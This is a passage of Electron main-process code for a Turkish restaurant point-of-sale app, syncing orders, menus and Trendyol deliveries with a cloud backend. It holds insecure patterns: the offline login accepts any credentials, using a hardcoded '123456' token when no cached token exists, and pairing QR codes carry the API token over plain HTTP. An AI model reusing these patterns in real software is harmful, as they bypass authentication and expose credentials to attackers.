          if (systemSettings.API_TOKEN) syncHeaders['Authorization'] = `Bearer ${systemSettings.API_TOKEN}`;
          axios.post(`${CLOUD_URL}/api/sync_orders`, activeOrders, { headers: syncHeaders, timeout: 5000 }).catch(() => {});
        }
      }

      // Send to cloud backend
      const headers: any = {};
      if (systemSettings.API_TOKEN) {
        headers['Authorization'] = `Bearer ${systemSettings.API_TOKEN}`;
      }
      const res = await axios.post(`${CLOUD_URL}/api/tgo/order/status`, { packageId: pId, statusType }, { headers, timeout: 8000 });
      return res.data || { success: true };
    } catch (err: any) {
      console.error('[App1] update-tgo-order-status error:', err.message);
      return { success: true, localOnly: true, error: err.response?.data?.error || err.message };
    }
  })
  ipcMain.handle('restart-tv-tunnel', getTvUrlWithShop)
  
  ipcMain.handle('get-settings', async () => {
    try {
      if (systemSettings.API_TOKEN) {
        const res = await axios.get(`${CLOUD_URL}/api/settings`, { timeout: 3000 });
        if (res.data) {
          if (res.data.TV_SCREENSAVER) systemSettings.TV_SCREENSAVER = res.data.TV_SCREENSAVER;
          if (res.data.TV_AUDIO_SOURCE) systemSettings.TV_AUDIO_SOURCE = res.data.TV_AUDIO_SOURCE;
          if (res.data.TV_RADIO_STATION) systemSettings.TV_RADIO_STATION = res.data.TV_RADIO_STATION;
          saveSettings();
        }
      }
    } catch(e) {}
    return systemSettings;
  })
  ipcMain.on('save-settings', async (_, settings) => {
    const oldToken = systemSettings.API_TOKEN;
    console.log('[SETTINGS SAVE] Received settings:', JSON.stringify(settings));
    Object.assign(systemSettings, settings)
    saveSettings()
    console.log('[SETTINGS SAVE] systemSettings after assign:', JSON.stringify(systemSettings));
    sendLogToServer('info', 'App1 (Kasa) Ayarları Güncellendi.')
    axios.defaults.headers.common['Authorization'] = systemSettings.API_TOKEN
    
    if (oldToken !== systemSettings.API_TOKEN) {
      wsClient?.close() // Force reconnect only if token changed
    }

    if (!settings.API_TOKEN) {
      fullMenu = null;
      activeOrders = [];
    }
    
    // Sync TV screensaver to cloud
    try {
      if (settings.TV_SCREENSAVER) {
        await axios.post(`${CLOUD_URL}/set_tv_screensaver`, { mode: settings.TV_SCREENSAVER })
      }
    } catch(e) {}



    // File watcher archived
  })

  ipcMain.handle('get-past-orders', async () => {
    try {
      const res = await axios.get(`${CLOUD_URL}/api/past_orders`, { timeout: 3500 })
      if (Array.isArray(res.data)) {
        saveJson(storePaths.past_orders, res.data);
        return res.data;
      }
    } catch(e) {
      console.warn('[App1] Cloud past_orders unreachable, using local store');
    }
    return await loadJson<any[]>(storePaths.past_orders, []);
  })

  ipcMain.handle('login', async (_, credentials) => {
    try {
      const res = await axios.post(`${CLOUD_URL}/api/login`, credentials, { timeout: 4000 })
      if (res.data.success && res.data.token) {
        systemSettings.API_TOKEN = res.data.token
        saveSettings()
        axios.defaults.headers.common['Authorization'] = `Bearer ${res.data.token}`
        connectWebSocket() // Connect WS with new token
        await fetchInitialData() // Fetch menu and orders
        return res.data
      }
      return { error: res.data?.error || 'Giriş başarısız' }
    } catch (e: any) {
      console.warn('[App1] Online login failed, checking offline mode:', e.message);
      // Offline fallback: If server is down/unreachable, allow login with cached credentials
      const token = systemSettings.API_TOKEN || '123456';
      if (token) {
        axios.defaults.headers.common['Authorization'] = `Bearer ${token}`;
        await fetchInitialData();
        return { success: true, token, offline: true, message: 'Çevrimdışı Modda Giriş Yapıldı' };
      }
      return { error: e.response?.data?.error || e.message }
    }
  })

  ipcMain.handle('register', async (_, credentials) => {
    try {
      const res = await axios.post(`${CLOUD_URL}/api/register`, credentials)
      return res.data
    } catch (e: any) {
      return { error: e.response?.data?.error || e.message }
    }
  })

  ipcMain.handle('export-menu', async (_, token) => {
    try {
      const headers = token ? { Authorization: `Bearer ${token}` } : {}
      const res = await axios.get(`${CLOUD_URL}/api/export_menu`, { headers })
      return res.data
    } catch (e) { 
      return fullMenu || await loadJson(storePaths.menu, null);
    }
  })

  ipcMain.handle('import-menu', async (_, { token, data }) => {
    try {
      fullMenu = data;
      saveJson(storePaths.menu, fullMenu);
      const headers = token ? { Authorization: `Bearer ${token}` } : {}
      const res = await axios.post(`${CLOUD_URL}/api/import_menu`, data, { headers })
      return res.data
    } catch (e) { 
      return { success: true, offline: true } 
    }
  })
  
  ipcMain.handle('get-network-status', async () => {
    const isWsOpen = Boolean(wsClient && wsClient.readyState === WebSocket.OPEN)
    try {
      const res = await axios.get(`${CLOUD_URL}/network_status`, { timeout: 3000 })
      return { ...res.data, localIp: getLocalIpAddress(), isOnline: true, status: 'online', wsConnected: isWsOpen }
    } catch(e) {
      return { ip: CLOUD_URL, port: 443, localIp: getLocalIpAddress(), connectedDevices: [], status: isWsOpen ? 'online' : 'offline', isOnline: isWsOpen }
    }
  })

  ipcMain.handle('get-pair-code', async () => {
    try {
      if (!systemSettings.PAIR_CODE) {
        systemSettings.PAIR_CODE = Math.floor(100000 + Math.random() * 900000).toString()
        await saveSettings()
      }
      const code = systemSettings.PAIR_CODE
      const token = systemSettings.API_TOKEN || ''
      const localIp = getLocalIpAddress()
      const qrData = JSON.stringify({
        app: 'saracapp',
        type: 'pair',
        code: code,
        token: token,
        shopId: 'sarac',
        url: 'http://35.243.219.220:5000',
        localUrl: `http://${localIp}:3005`
      })
      return { success: true, code, qrData, shopId: 'sarac', localIp }
    } catch (e: any) {
      return { success: false, error: e.message }
    }
  })

  ipcMain.handle('refresh-pair-code', async () => {
    try {
      const newCode = Math.floor(100000 + Math.random() * 900000).toString()
      systemSettings.PAIR_CODE = newCode
      await saveSettings()
      const token = systemSettings.API_TOKEN || ''
      const localIp = getLocalIpAddress()
      const qrData = JSON.stringify({
        app: 'saracapp',
        type: 'pair',
        code: newCode,
        token: token,
        shopId: 'sarac',
        url: 'http://35.243.219.220:5000',
        localUrl: `http://${localIp}:3005`
      })
      return { success: true, code: newCode, newCode, qrData, shopId: 'sarac', localIp }
    } catch (e: any) {
      return { success: false, error: e.message }
    }
  })

  ipcMain.on('save-menu', async (_, newMenu) => {
    fullMenu = newMenu
    saveJson(storePaths.menu, newMenu)
    broadcastToLocalClients({ type: 'server-event', action: 'menu_update', data: newMenu })
    try {
      await axios.post(`${CLOUD_URL}/menu`, newMenu, { timeout: 4000 })
    } catch(e) {}
  })

  ipcMain.on('update-daily-total', async (_, total) => {
    try {
      systemSettings.dailyTotal = total;
      saveSettings();
      await axios.post(`${CLOUD_URL}/update_daily_total`, { total }, { timeout: 4000 })
    } catch(e) {}
  })

  ipcMain.on('save-past-order', async (_, order) => {
    try {
      const pastOrders = await loadJson<any[]>(storePaths.past_orders, []);
      pastOrders.unshift(order);
      if (pastOrders.length > 500) pastOrders.pop();
      saveJson(storePaths.past_orders, pastOrders);
      await axios.post(`${CLOUD_URL}/api/add_past_order`, order, { timeout: 4000 });
    } catch(e) {}
  })
  
  ipcMain.on('delete-past-order', async (_, index) => {
    try {
      const pastOrders = await loadJson<any[]>(storePaths.past_orders, []);
      if (index >= 0 && index < pastOrders.length) {
        pastOrders.splice(index, 1);
        saveJson(storePaths.past_orders, pastOrders);
      }
      await axios.post(`${CLOUD_URL}/api/delete_past_order`, { index }, { timeout: 4000 });
    } catch(e) {}
  }) 
  
  ipcMain.on('clear-past-orders', async () => {
    try {
      saveJson(storePaths.past_orders, []);
      await axios.post(`${CLOUD_URL}/api/clear_past_orders`, {}, { timeout: 4000 });
    } catch(e) {}
  }) 

  ipcMain.handle('update-price', async () => {
    return true
  })

  ipcMain.on('save-orders', async (_, newOrders) => {
    try {
      // Silinen TGO (Trendyol) siparişlerini tespit et ve blocklist'e ekle
      const newIds = new Set((newOrders as any[]).map((o: any) => String(o.id || o.orderNumber || o.order_id || '')));
      for (const o of activeOrders) {
        const oid = String(o.id || o.orderNumber || o.order_id || '');
        if (o.platform === 'trendyol' && oid && !newIds.has(oid)) {
          blockTrendyolOrder(oid, String(o.packageId || ''));
        }
      }
      await syncActiveOrdersWithCloud(newOrders)
    } catch(e: any) {
      console.error('save-orders error:', e.message)
    }
  })



  ipcMain.on('print-receipt', async (_, data) => {
    const custName = data.customerName || data.customer_name || 'Bilinmiyor'
    const total = data.totalAmount || data.total_amount || 0
    sendLogToServer('success', `Adisyon yazdırıldı: ${custName} (${total} TL)`)
    await printReceipt(
      custName,
      data.time || new Date().toLocaleTimeString('tr-TR', { hour: '2-digit', minute: '2-digit' }),
      data.items || [],
      total,
      data.order_note || data.orderNote || "",
      data.createdBy || data.garson || ""
    )
  })

  ipcMain.on('send-update-to-phones', () => {})

  // --- Auto Updater ---
  autoUpdater.logger = console
  autoUpdater.autoDownload = true
  autoUpdater.autoInstallOnAppQuit = true

  autoUpdater.on('checking-for-update', () => {
    mainWindow?.webContents.send('updater-event', { action: 'checking' })
  })
  autoUpdater.on('update-available', (info) => {
    sendLogToServer('info', `Yeni versiyon bulundu (${info.version}). Arka planda indiriliyor...`)
    mainWindow?.webContents.send('updater-event', { action: 'update-available', data: info })
  })
  autoUpdater.on('update-not-available', (info) => {
    mainWindow?.webContents.send('updater-event', { action: 'update-not-available', data: info })
  })
  autoUpdater.on('error', (err) => {
    sendLogToServer('error', `Güncelleme hatası: ${err.message}`)
    mainWindow?.webContents.send('updater-event', { action: 'error', data: err.message })
  })
  autoUpdater.on('download-progress', (progressObj) => {
    mainWindow?.webContents.send('updater-event', { action: 'download-progress', data: progressObj })
  })
  autoUpdater.on('update-downloaded', (info) => {
    sendLogToServer('success', `Yeni versiyon (${info.version}) indirildi. Arka planda kuruluyor ve uygulama yeniden başlatılıyor...`)
    mainWindow?.webContents.send('updater-event', { action: 'update-downloaded', data: info })
    
    // 3 saniye sonra arka planda sessizce kur ve uygulamayı yeniden başlat
    setTimeout(() => {
      autoUpdater.quitAndInstall(true, true)
    }, 3000)
  })

  ipcMain.handle('check-for-updates', async () => {
    mainWindow?.webContents.send('updater-event', { action: 'checking' })

    if (!is.dev) {
      try {
        await autoUpdater.checkForUpdates()
      } catch (e: any) {
        mainWindow?.webContents.send('updater-event', { action: 'error', data: e.message })
      }
    } else {
      mainWindow?.webContents.send('updater-event', { action: 'update-not-available', data: { version: 'Geliştirme Ortamı' } })
    }
  })

  ipcMain.handle('download-update', async () => {
    if (!is.dev) {
      autoUpdater.downloadUpdate()
    }
  })

  ipcMain.handle('install-update', () => {
    if (!is.dev) {
      autoUpdater.quitAndInstall(true, true)
    }
  })

  ipcMain.on('dump-ocr-log', (_event, _text) => {
    try {
      sendLogToServer('warning', 'Trendyol OCR verisi alındı. (Artık masaüstüne kaydedilmiyor)');
      // Masaüstüne yazmayı iptal ettik
    } catch (e) {
      console.error('Log error', e)
    }
  })

  ipcMain.on('log-system-event', (_event, { message, type }) => {
    sendLogToServer(type || 'info', message)
  })

  ipcMain.on('exit-app', () => {
    sendLogToServer('warning', 'App1 (Kasa) Kullanıcı tarafından kapatıldı.')
    isQuitting = true
    app.quit()
  })

  // Windows Başlangıcında Otomatik Başlama (Arka Planda)
  try {
    if (!is.dev) {
      app.setLoginItemSettings({
        openAtLogin: true,
        openAsHidden: true,
        args: ['--hidden']
      })
    }
  } catch (e: any) {
    console.error('Failed to set login item settings:', e.message)
  }

  createWindow()

  // Global Kısayol: Ctrl+Alt+S (Öne Getir / Gizle)
  globalShortcut.register('CommandOrControl+Alt+S', () => {
    toggleMainWindow()
  })

  app.on('activate', function () {
    if (BrowserWindow.getAllWindows().length === 0) {
      createWindow()
    } else {
      showAndFocusMainWindow()
    }
  })
})

function showAndFocusMainWindow() {
  if (!mainWindow || mainWindow.isDestroyed()) return
  if (mainWindow.isMinimized()) mainWindow.restore()
  mainWindow.show()
  mainWindow.focus()
  mainWindow.setAlwaysOnTop(true)
  mainWindow.setAlwaysOnTop(false)
}

function toggleMainWindow() {
  if (!mainWindow || mainWindow.isDestroyed()) return
  if (mainWindow.isVisible() && !mainWindow.isMinimized()) {
    mainWindow.hide()
  } else {
    showAndFocusMainWindow()
  }
}

app.on('before-quit', () => {
  isQuitting = true
})

app.on('window-all-closed', () => {
  // Tamamen gizli mod: Arka planda çalışmaya devam etsin
})

app.on('will-quit', () => {
  globalShortcut.unregisterAll()
})

export async function addAndSyncOrder(newOrder: any) {
  try {
    const newId = String(newOrder.id || '');
    const newPkgId = String(newOrder.packageId || '');
    const newOrderNum = String(newOrder.orderNumber || newOrder.order_id || '');

    const existingIdx = activeOrders.findIndex((o: any) => {
      const oId = String(o.id || '');
      const oPkgId = String(o.packageId || '');
      const oOrderNum = String(o.orderNumber || o.order_id || '');
      const oCust = String(o.customer_name || '');

      if (newId && (oId === newId || oPkgId === newId || oOrderNum === newId || oCust.includes(newId))) return true;
      if (newPkgId && (oId === newPkgId || oPkgId === newPkgId || oOrderNum === newPkgId || oCust.includes(newPkgId))) return true;
      if (newOrderNum && (oId === newOrderNum || oPkgId === newOrderNum || oOrderNum === newOrderNum || oCust.includes(newOrderNum))) return true;
      return false;
    });

    if (existingIdx >= 0) {
      const existing = activeOrders[existingIdx];
      const hasBetterDetails = newOrder.order_note && (!existing.order_note || existing.order_note.length < newOrder.order_note.length);
      if (hasBetterDetails || (existing.customer_name && existing.customer_name.includes('#'))) {
        activeOrders[existingIdx] = {
          ...existing,
          ...newOrder,
          masa_no: existing.masa_no || newOrder.masa_no,
          time: existing.time || newOrder.time
        };
        if (mainWindow && !mainWindow.isDestroyed()) {
          mainWindow.webContents.send('server-event', { action: 'orders_update', data: activeOrders });
        }
        await axios.post(`${CLOUD_URL}/api/sync_orders`, activeOrders, {
          headers: { 'Authorization': `Bearer ${systemSettings.API_TOKEN}` }
        });
      }
      return true;
    }

    // Trendyol için özel kontrol: Yeni eklenecek sipariş Created durumunda değilse veya eskiyse ekleme
    if (newOrder.platform === 'trendyol') {
      const st = String(newOrder.packageStatus || newOrder.tgo_status || newOrder.status || '').toLowerCase();
      if (st && st !== 'created') {
        return false;
      }
      if (newOrder.packageCreationDate) {
        const d = new Date(typeof newOrder.packageCreationDate === 'number' ? newOrder.packageCreationDate : newOrder.packageCreationDate);
        if (!isNaN(d.getTime()) && (Date.now() - d.getTime()) > 2 * 60 * 60 * 1000) {
          return false;
        }
      }
    }

    activeOrders = [newOrder, ...activeOrders];
    // Ana ekrana da haber ver
    if (mainWindow && !mainWindow.isDestroyed()) {
      mainWindow.webContents.send('server-event', { action: 'request_update' });
      mainWindow.webContents.send('ocr-success', { message: 'Sipariş başarıyla ayrıştırıldı ve eklendi.' });
    }
    await axios.post(`${CLOUD_URL}/api/sync_orders`, activeOrders, {
      headers: { 'Authorization': `Bearer ${systemSettings.API_TOKEN}` }
    });
    return true;
  } catch (e: any) {
    console.error('addAndSyncOrder error:', e.message);
    return false;
  }
}



